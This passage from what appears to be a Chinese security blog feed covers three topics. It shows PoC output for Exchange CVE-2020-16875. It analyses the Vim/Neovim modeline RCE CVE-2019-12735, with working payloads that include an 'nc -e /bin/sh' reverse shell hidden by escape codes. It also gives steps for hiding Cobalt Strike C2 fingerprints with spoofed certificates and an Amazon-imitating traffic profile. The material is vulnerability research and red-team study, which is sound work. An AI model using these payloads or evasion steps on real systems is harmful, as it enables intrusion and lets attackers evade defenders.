<p><a href="https://srcincite.io/pocs/cve-2020-16875.py.txt">https://srcincite.io/pocs/cve-2020-16875.py.txt</a></p>
<p><a href="https://srcincite.io/pocs/cve-2020-16875.ps1.txt">https://srcincite.io/pocs/cve-2020-16875.ps1.txt</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">researcher@incite:~$ .&#x2F;poc.py</span><br><span class="line">(+) usage: .&#x2F;poc.py &lt;target&gt; &lt;user:pass&gt; &lt;cmd&gt;</span><br><span class="line">(+) eg: .&#x2F;poc.py 192.168.75.142 harrym@exchangedemo.com:user123### mspaint</span><br><span class="line"></span><br><span class="line">researcher@incite:~$ .&#x2F;poc.py 192.168.75.142 harrym@exchangedemo.com:user123### mspaint</span><br><span class="line">(+) logged in as harrym@exchangedemo.com</span><br><span class="line">(+) found the __viewstate: &#x2F;wEPDwUILTg5MDAzMDFkZFAeyPS7&#x2F;eBJ4lPNRNPBjm8QiWLWnirQ1vsGlSyjVxa5</span><br><span class="line">(+) triggered rce as SYSTEM!</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Exchange-Server</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE-Vim-Neovim 任意代码执行漏洞分析(CVE-2019-12735)</title>
    <url>/2019/06/24/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/pwnable.kr/Exploit/RCE-Vim-Neovim-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2019-12735/</url>
    <content><![CDATA[<h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a><strong>0x00 背景</strong></h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/xxxxxx.jpg" alt="img"></p>
<p>vim/neovim 爆出远程代码执行漏洞，打开恶意文件即可出发，受影响的版本：</p>
<p>vim&lt;8.1.1365 Neovim&lt;0/36</p>
<p><strong><a href="https://github.com/oldthree3/CVE-2019-12735-VIM-NEOVIM">poc_address</a></strong></p>
<a id="more"></a>

<h3 id="0x01-漏洞成因"><a href="#0x01-漏洞成因" class="headerlink" title="0x01 漏洞成因"></a><strong>0x01 漏洞成因</strong></h3><p>漏洞产生于Vim的modeline功能中，modeline功能便于文件在共享时保持一致的编辑格式。例如，我们通常会在Python文件开头加上modeline来设置缩进</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># vim: ai ts&#x3D;4 sts&#x3D;4 et sw&#x3D;4 ft&#x3D;python # vim: autoindent tabstop&#x3D;4 shiftwidth&#x3D;4 expandtab softtabstop&#x3D;4 filetype&#x3D;python</span><br></pre></td></tr></table></figure>

<p>由于modeline中的命令运行于命令模式(在正常模式下按:进入)，而在命令模式下可以进行修改文件、执行脚本等敏感操作，这就产生了被恶意攻击的可能。</p>
<p>因此从安全角度考虑，在modeline中，只支持set命令，同时一些配置项会被隔离到沙箱(sandbox)中运行。</p>
<p>在沙箱中，修改文件、修改快捷键、执行shell脚本等操作都被禁止。沙箱检查由函数check_secure实现，用HAVE_SANDBOX判断是否在沙箱中，是的话生成错误信息并返回TRUE。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; vim&#x2F;src&#x2F;ex_cmds.c</span><br><span class="line">&#x2F;*</span><br><span class="line"> * Check if the secure flag is set (.exrc or .vimrc in current directory).</span><br><span class="line"> * If so, give an error message and return TRUE.</span><br><span class="line"> * Otherwise, return FALSE.</span><br><span class="line"> *&#x2F;</span><br><span class="line">    int</span><br><span class="line">check_secure(void)</span><br><span class="line">&#123;</span><br><span class="line">    if (secure)</span><br><span class="line">    &#123;</span><br><span class="line">    secure &#x3D; 2;</span><br><span class="line">    emsg(_(e_curdir));</span><br><span class="line">    return TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">#ifdef HAVE_SANDBOX</span><br><span class="line">    &#x2F;*</span><br><span class="line">     * In the sandbox more things are not allowed, including the things</span><br><span class="line">     * disallowed in secure mode.</span><br><span class="line">     *&#x2F;</span><br><span class="line">    if (sandbox !&#x3D; 0)</span><br><span class="line">    &#123;</span><br><span class="line">    emsg(_(e_sandbox));</span><br><span class="line">    return TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br><span class="line">    return FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>check_secure函数在一些涉及敏感操作的地方被用到，例如在buf_write函数中的使用，禁止了在沙箱模式下写buf文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F; vim&#x2F;src&#x2F;fileio.c</span><br><span class="line">    int</span><br><span class="line">buf_write(...)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">    &#x2F;*</span><br><span class="line">     * Disallow writing from .exrc and .vimrc in current directory for</span><br><span class="line">     * security reasons.</span><br><span class="line">     *&#x2F;</span><br><span class="line">    if (check_secure())</span><br><span class="line">      return FAIL;</span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然而在:source!命令中，并没有进行沙箱检查。:source!命令用于在命令模式下逐个运行目标文件中的命令，通常被用来加载配置文件。同时，在命令模式下有多种方式执行shell脚本。</p>
<p>前文提到，可以在modeline中设置的配置项是有限的，因此需要一个能让我们执行:source!的配置项。</p>
<p>配置项的限制是通过P_SECURE这个flag来判断的，foldexpr没有设置P_SECURE，符合要求。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F; vim&#x2F;src&#x2F;option.c</span><br><span class="line">&#x2F;&#x2F; foldexpr 未设置P_SECURE</span><br><span class="line">static struct vimoption options[] &#x3D;</span><br><span class="line">&#123;</span><br><span class="line">   &#x2F;&#x2F; ...</span><br><span class="line">    &#123;&quot;foldexpr&quot;,    &quot;fde&quot;,  P_STRING|P_ALLOCED|P_VIM|P_VI_DEF|P_RWIN|P_MLE,</span><br><span class="line">#if defined(FEAT_FOLDING) &amp;&amp; defined(FEAT_EVAL)</span><br><span class="line">                (char_u *)VAR_WIN, PV_FDE,</span><br><span class="line">                &#123;(char_u *)&quot;0&quot;, (char_u *)NULL&#125;</span><br><span class="line">#else</span><br><span class="line">                (char_u *)NULL, PV_NONE,</span><br><span class="line">                &#123;(char_u *)NULL, (char_u *)0L&#125;</span><br><span class="line">#endif</span><br><span class="line">                SCTX_INIT&#125;</span><br><span class="line">&#x2F;&#x2F; ...          </span><br><span class="line">&#125;;</span><br><span class="line">&#x2F;&#x2F; ...</span><br><span class="line">&#x2F;&#x2F; 通过option的flag判断</span><br><span class="line">if (flags &amp; (P_SECURE | P_NO_ML))</span><br><span class="line">&#123;</span><br><span class="line">    errmsg &#x3D; _(&quot;E520: Not allowed in a modeline&quot;);</span><br><span class="line">    goto skip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因此，可以构造PoC如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">:!uname -a||&quot; vi:fen:fdm&#x3D;expr:fde&#x3D;assert_fails(&quot;source\!\ \%&quot;):fdl&#x3D;0:fdt&#x3D;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>保存成文件poc.txt，用Vim打开，命令uname -a将会被执行。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/zzzzz-1.jpg" alt="img"></p>
<h3 id="0x02-POC-分析"><a href="#0x02-POC-分析" class="headerlink" title="0x02 POC 分析"></a><strong>0x02 POC 分析</strong></h3><p>命令执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># poc.txt</span><br><span class="line">:!uname -a||&quot; vi:fen:fdm&#x3D;expr:fde&#x3D;assert_fails(&quot;source\!\ \%&quot;):fdl&#x3D;0:fdt&#x3D;&quot;&lt;&#x2F;code&gt;&lt;br &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>打开poc.txt时，Vim会在首行寻找modeline，从vi:处开始匹配，忽略前面的字符，解析出的modeline表达式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi:fen:fdm&#x3D;expr:fde&#x3D;assert_fails&lt;code class&#x3D;&quot;language-bash&quot;&gt;(&quot;source\!\ \%&quot;)&lt;&#x2F;code&gt;:fdl&#x3D;0:fdt&#x3D;</span><br></pre></td></tr></table></figure>

<p>modeline中的配置项(option settings)通过:分隔，vi后面的每一项都会当做:set的参数在normal模式下被运行。</p>
<p>这里的一系列配置都是有关于代码折叠的，让我们逐个解析配置项:</p>
<ul>
<li>fen: 当值为off时，所有的代码折叠都被打开，默认是off</li>
<li>fdm=expr: 产生折叠的方式，可能的值有manual, indent, expr, marker, syntax, diff。 其中expr表示将由’foldexpr’的值来给出某一行的折叠level</li>
<li>fde=assert_fails(“source! %”): fde是foldexpr的缩写，功能见上一条；source!命令前文已经提过，这里的%是指当前文件；assert_fails用于执行命令并处理错误信息，这里我们只用于执行命令。</li>
<li>fdl=0: 折叠的程度，设置为0时会关闭所有的折叠，默认是0</li>
<li>fdt: 被关闭的折叠处显示的字符串,默认是”foldtext()”</li>
</ul>
<p>综合下来，这个modeline会让Vim执行:source! poc.txt，让我们来看会发生什么。</p>
<p>poc.txt中只有一行，相当于在Vim normal mode中运行这一行，:!xxx表示在shell中执行xxx命令。</p>
<p>所以，下面的命令会在shell中被执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi:fen:fdm&#x3D;expr:fde&#x3D;assert_fails&lt;code class&#x3D;&quot;language-bash&quot;&gt;(&quot;source\!\ \%&quot;)&lt;&#x2F;code&gt;:fdl&#x3D;0:fdt&#x3D;</span><br></pre></td></tr></table></figure>

<p>||表示只有在前一个命令执行失败后才会执行后一个命令，在这里uname -a会执行成功，||后面的字符串被忽略，所以PoC到这里就执行成功了。</p>
<h3 id="0x03-反弹shell"><a href="#0x03-反弹shell" class="headerlink" title="0x03 反弹shell"></a><strong>0x03 反弹shell</strong></h3><p>漏洞作者给出了另一个PoC，可以反弹一个shell, 利用了转义字符使得恶意代码在终端不可见，还在PoC执行结束后重写了文件使得痕迹被彻底清除。</p>
<p># 在另一终端窗口运行nc -vlp 9999</p>
<p># shell.txt</p>
<p>x1b[?7lx1bSNothing here.x1b:silent! w | call system(‘nohup nc 127.0.0.1 9999 -e /bin/sh &amp;’) | redraw! | file | silent! # ” vim: set fen fdm=expr fde=assert_fails(‘set\ fde=x\ |\ source!\ %’) fdl=0: x16x1b[1Gx16x1b[KNothing here.”x16x1b[D n</p>
<p>除去转义字符和重写文件部分，可以简化成如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># shell_simple.txt</span><br><span class="line">:call system(&#39;nohup nc 127.0.0.1 9999 -e &#x2F;bin&#x2F;sh &amp;&#39;)  ||&quot; vi:fen:fdm&#x3D;expr:fde&#x3D;assert_fails(&quot;source! %&quot;):fdl&#x3D;0:fdt&#x3D;&quot;</span><br></pre></td></tr></table></figure>

<p>由前面的知识我们可以知道，此poc会在vim的normal模式下运行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:call system(&#39;nohup nc 127.0.0.1 9999 -e &#x2F;bin&#x2F;sh &amp;&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/111.gif" alt="img"></p>
<p>拆开分析：</p>
<ul>
<li>call: 执行一个函数</li>
<li>system(): 执行shell命令</li>
<li>nohup nc 127.0.0.1 9999 -e /bin/sh &amp;： 反弹shell</li>
</ul>
<p><strong>ps:</strong></p>
<p><strong>modeline功能必须打开</strong></p>
<p>普通用户的modeline功能默认开启，而root用户是默认关闭的。</p>
<p>可以在命令模式下使用:echo &amp;modeline查看开启情况，返回1就是开启、0就是关闭。modeline功能</p>
<p>需要打开，PoC才能成功运行，可以在~/.vimrc中(若没有自行创建)加上一行set modeline确保开启此功能。</p>
<p>第二个反弹shell的PoC，复制粘贴到本地运行会失败</p>
<p>该问题出现在转义字符上，用二进制查看工具Okteta打开shell.txt，可以看到转义字符x1b是非显示字符。转义字符常常用来控制终端显示、光标移动等，第二个PoC中就利用了转义字符隐藏代码的功能，有关转义字符的知识可以参考这个链接<a href="http://notes.burke.libbey.me/ansi-escape-codes/">ansi-escape-codes</a>。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/cccc.png" alt="img"></p>
<table>
<thead>
<tr>
<th>1234</th>
<th>$ cat shell.txt  # 部分输出在终端中被隐藏Nothing here$ cat -A shell.txt ^[[?7l^[SNothing here.^[:silent! w | call system(‘nohup nc 127.0.0.1 9999 -e /bin/sh &amp;’) | redraw! | file | silent! # “ vim: set fen fdm=expr fde=assert_fails(‘set fde=x | source! %’) fdl=0: ^V^[[1G^V^[[KNothing here.”^V^[[D $</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>作者文章给出代码中的x1b是为了更清晰地表达，并不能直接复制使用。</p>
<p>所以如果我们想要修改第二段利用代码，比较简单的方式是是下载源文件，修改执行命令的部分，当然也可以使用二进制编辑器直接编写或修改。</p>
<h3 id="0x04-修复"><a href="#0x04-修复" class="headerlink" title="0x04 修复"></a>0x04 修复</h3><p>Vim发布了 patch 8.1.1365: source command doesn’t check for the sandbox</p>
<p>在openscript函数中增加了沙箱的检查，防止在沙箱中source文件。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1111-1.png" alt="img"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/222-2.png" alt="img"> <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1111-1.png" alt="img"></p>
<h3 id="0x05-安全建议"><a href="#0x05-安全建议" class="headerlink" title="0x05 安全建议"></a>0x05 安全建议</h3><ol>
<li><ol>
<li>更新到vim &gt;= 8.1.1365 / neovim &gt; v0.3.6</li>
<li>在vimrc中加入set nomodeline，禁用modeline</li>
<li>不要轻易打开来路不明的文件</li>
</ol>
</li>
</ol>
<h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><p><a href="https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md">2019-06-04_ace-vim-neovim</a></p>
<p><a href="https://www.anquanke.com/post/id/180386">Slash analyze</a></p>
<p><a href="https://vimhelp.org/">vim online help</a></p>
<p><a href="https://github.com/vim/vim/commit/5357552">vim patch</a></p>
]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>VIM</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt Strike特征隐藏与流量分析</title>
    <url>/2021/10/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/Cobalt-Strike%E7%89%B9%E5%BE%81%E9%9A%90%E8%97%8F%E4%B8%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="Cobalt-Strike简介"><a href="#Cobalt-Strike简介" class="headerlink" title="Cobalt Strike简介"></a>Cobalt Strike简介</h1><p>Cobalt Strike is software for Adversary Simulations and Red Team Operations. Cobalt Strike 简称CS， <a href="https://blog.ateam.qianxin.com/CobaltStrike4.0用户手册_中文翻译.pdf">A-team详细介绍使用网址</a>。CS是一款优秀的后渗透工具，可以在获取主机权限后进行长久权限维持，快速进行内网提权，凭据导出等。在后渗透中如果未修改特征，容易被流量审计设备监控，被蓝队溯源。</p>
<p>Cobalt Strike 是一个为对手模拟和红队行动而设计的平台，主要用于执行有目标的攻击和模拟高级威胁 者的后渗透行动。本章中会概述 Cobalt Strike 的功能集和相关的攻击流程。在本手册的剩余部分中会 详细的讨论这些功能。</p>
<a id="more"></a>

<h1 id="Cobalt-Strike的特征"><a href="#Cobalt-Strike的特征" class="headerlink" title="Cobalt Strike的特征"></a>Cobalt Strike的特征</h1><p>teamserver主控端使用的加密证书</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面&#x2F;cobaltstrike4.0# ls -l</span><br><span class="line">总用量 27748</span><br><span class="line">-rwxrw-rw- 1 root root      126 12月  5  2019 agscript</span><br><span class="line">-rwxrw-rw- 1 root root      144 12月  5  2019 c2lint</span><br><span class="line">-rwxrw-rw- 1 root root      256 1月  25  2020 cobaltstrike.auth</span><br><span class="line">-rwxrw-rw- 1 root root   785468 3月  15  2019 CobaltstrikeCN.jar</span><br><span class="line">-rwxrw-rw- 1 root root 27487620 3月  20  2020 cobaltstrike.jar</span><br><span class="line">-rwxrw-rw- 1 root root     2315 3月  17  2019 cobaltstrike.store</span><br><span class="line">-rwxrw-rw- 1 root root    96104 12月  5  2019 icon.jpg</span><br><span class="line">-rwxrw-rw- 1 root root      141 12月  5  2019 peclone</span><br><span class="line">-rwxrw-rw- 1 root root      141 3月  19  2020 start.bat</span><br><span class="line">-rwxrw-rw- 1 root root      108 3月  19  2020 start.sh</span><br><span class="line">-rwxrw-rw- 1 root root     1865 3月  19  2020 teamserver</span><br><span class="line">-rwxrw-rw- 1 root root     2005 3月  19  2020 teamserver.bat</span><br><span class="line">drwxr-xr-x 2 root root     4096 10月 13 14:41 third-party</span><br></pre></td></tr></table></figure>

<p>这里的cobalstrike.store里面的证书是用来teamserver主控端使用的加密证书(默认端口50050)，而不是主机上线的时候使用的</p>
<p>特征很容易看到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keytool -list -v -keystore cobaltstrike.store</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028162530859.png" alt="image-20211028162530859"></p>
<p>我们去fofa进行搜索可以发现大量服务端机器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">port&#x3D;&quot;50050&quot; &amp;&amp; cert&#x3D;&quot;cobaltstrike&quot;</span><br></pre></td></tr></table></figure>

<p>![image-20211028162701322](../../../../../../Library/Application Support/typora-user-images/image-20211028162701322.png)</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028162745166.png" alt="image-20211028162745166"></p>
<p>我们也可以使用指纹来查询哪些是cobaltStrike的服务器，下面是4.0的证书指纹</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028162818883.png" alt="image-20211028162818883"></p>
<p>可以到censys去查询该证书</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7B49FC589E7E738E3457859D269996ECEF83F693570B0AC482C426B1FA04BD73</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028162903879.png" alt="image-20211028162903879"></p>
<p>也可以查看使用此证书的主机</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028162934208.png" alt="image-20211028162934208"></p>
<h1 id="去除特征的几种方法"><a href="#去除特征的几种方法" class="headerlink" title="去除特征的几种方法"></a>去除特征的几种方法</h1><h2 id="修改默认端口号"><a href="#修改默认端口号" class="headerlink" title="修改默认端口号"></a>修改默认端口号</h2><p>第一种是直接编辑teamserver进行启动项修改。./teamserver 1.1.1.1 password 直接修改teamserver vim teamserver</p>
<p>编辑teamserver文件 搜索server_port</p>
<p>修改端口为12345</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028163024781.png" alt="image-20211028163024781"></p>
<p>再次访问发现端口已经修改</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028163051513.png" alt="image-20211028163051513"></p>
<h2 id="修改默认SSL证书"><a href="#修改默认SSL证书" class="headerlink" title="修改默认SSL证书"></a>修改默认SSL证书</h2><p>存在的特征，需要重新创建一个新的不一样的证书。</p>
<p>使用以下命令创建证书</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keytool -keystore cobaltstrike.store -storepass 密码 -keypass 密码 </span><br><span class="line">-genkey -keyalg RSA -alias google.com -dname &quot;CN&#x3D;(名字与姓氏),</span><br><span class="line"> OU&#x3D;(组织单位名称), O&#x3D;(组织名称), L&#x3D;(城市或区域名称), </span><br><span class="line"> ST&#x3D;(州或省份名称), C&#x3D;(单位的两字母国家代码)&quot;</span><br></pre></td></tr></table></figure>

<p>比如修改为百度或者360</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">360</span><br><span class="line">keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 360.com -dname &quot;CN&#x3D;US, OU&#x3D;360.com, O&#x3D;Sofaware, L&#x3D;Somewhere, ST&#x3D;Cyberspace, C&#x3D;CN&quot;</span><br><span class="line"></span><br><span class="line">baidu</span><br><span class="line">keytool -keystore cobaltStrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias baidu.com -dname &quot;CN&#x3D;ZhongGuo, OU&#x3D;CC, O&#x3D;CCSEC, L&#x3D;BeiJing, ST&#x3D;ChaoYang, C&#x3D;CN&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028163409229.png" alt="image-20211028163409229"></p>
<p>再次运行发现 证书已经改变特征已经为360公司</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028163438037.png" alt="image-20211028163438037"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028163540010.png" alt="image-20211028163540010"></p>
<h2 id="HTTP流量"><a href="#HTTP流量" class="headerlink" title="HTTP流量"></a>HTTP流量</h2><p>在使用Cobalt Strike HTTP进行对应通信的时候，我们使用wireshark来抓取HTTP协议。包括请求的固定地址，请求头等等。可以看到一些固定的请求信息特征可以查看到。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211110173257064.png" alt="image-20211110173257064"></p>
<p>对应的Malleable-C2-Profiles配置文件由此而来，它允许我们仅通过一个简单的配置文件来改变Beacon和cobaltstrike通信时的流量特征和行为。</p>
<p><a href="https://github.com/rsmudge/Malleable-C2-Profiles">https://github.com/rsmudge/Malleable-C2-Profiles</a></p>
<p>在github上有师傅给出了一些APT 和正常厂商对应行为的配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set sleeptime &quot;5000&quot;;</span><br><span class="line">set jitter    &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; Trident&#x2F;7.0; rv:11.0) like Gecko&quot;;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;s&#x2F;ref&#x3D;nb_sb_noss_1&#x2F;167-3294888-0262949&#x2F;field-keywords&#x3D;books&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;www.amazon.com&quot;;</span><br><span class="line"></span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;session-token&#x3D;&quot;;</span><br><span class="line">            prepend &quot;skin&#x3D;noskin;&quot;;</span><br><span class="line">            append &quot;csm-hit&#x3D;s-24KU11BB82RZSYGJ3BDK|1419899012996&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Server&quot; &quot;Server&quot;;</span><br><span class="line">        header &quot;x-amz-id-1&quot; &quot;THKUYEZKCKPGY5T42PZT&quot;;</span><br><span class="line">        header &quot;x-amz-id-2&quot; &quot;a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo&#x3D;&quot;;</span><br><span class="line">        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;</span><br><span class="line">        header &quot;Content-Encoding&quot; &quot;gzip&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line">    </span><br><span class="line">    set uri &quot;&#x2F;N4215&#x2F;adj&#x2F;amzn.us.sr.aps&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text&#x2F;xml&quot;;</span><br><span class="line">        header &quot;X-Requested-With&quot; &quot;XMLHttpRequest&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;www.amazon.com&quot;;</span><br><span class="line"></span><br><span class="line">        parameter &quot;sz&quot; &quot;160x600&quot;;</span><br><span class="line">        parameter &quot;oe&quot; &quot;oe&#x3D;ISO-8859-1;&quot;;</span><br><span class="line"></span><br><span class="line">        id &#123;</span><br><span class="line">            parameter &quot;sn&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parameter &quot;s&quot; &quot;3717&quot;;</span><br><span class="line">        parameter &quot;dc_ref&quot; &quot;http%3A%2F%2Fwww.amazon.com&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Server&quot; &quot;Server&quot;;</span><br><span class="line">        header &quot;x-amz-id-1&quot; &quot;THK9YEZJCKPGY5T42OZT&quot;;</span><br><span class="line">        header &quot;x-amz-id-2&quot; &quot;a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo&#x3D;&quot;;</span><br><span class="line">        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;</span><br><span class="line">        header &quot;x-ua-compatible&quot; &quot;IE&#x3D;edge&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过c2lint来检测该文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ .&#x2F;c2lint amazon.profile</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">default</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">http-get</span><br><span class="line">--------</span><br><span class="line">GET &#x2F;s&#x2F;ref&#x3D;nb_sb_noss_1&#x2F;167-3294888-0262949&#x2F;field-keywords&#x3D;books HTTP&#x2F;1.1</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Host: www.amazon.com</span><br><span class="line">Cookie: skin&#x3D;noskin;session-token&#x3D;lCZcYm9qlpy8hT41NUthoA&#x3D;&#x3D;csm-hit&#x3D;s-24KU11BB82RZSYGJ3BDK|1419899012996</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; Trident&#x2F;7.0; rv:11.0) like Gecko</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: Server</span><br><span class="line">x-amz-id-1: THKUYEZKCKPGY5T42PZT</span><br><span class="line">x-amz-id-2: a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo&#x3D;</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Length: 64</span><br><span class="line"></span><br><span class="line">*..[..6..8...Q|?...,V...Md...f..m.8y.....f.E...Ho..pOy....C..&#123;^.</span><br><span class="line"></span><br><span class="line">http-post</span><br><span class="line">---------</span><br><span class="line">POST &#x2F;N4215&#x2F;adj&#x2F;amzn.us.sr.aps?sz&#x3D;160x600&amp;oe&#x3D;oe&amp;sn&#x3D;24791&amp;s&#x3D;3717&amp;dc_ref&#x3D;http%3A%2F%2Fwww.amazon.com HTTP&#x2F;1.1</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Host: www.amazon.com</span><br><span class="line">Content-Length: 24</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; Trident&#x2F;7.0; rv:11.0) like Gecko</span><br><span class="line"></span><br><span class="line">29Mivrcb3fH6Gw0cZioEMA&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: Server</span><br><span class="line">x-amz-id-1: THK9YEZJCKPGY5T42OZT</span><br><span class="line">x-amz-id-2: a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo&#x3D;</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">x-ua-compatible: IE&#x3D;edge</span><br><span class="line">Content-Length: 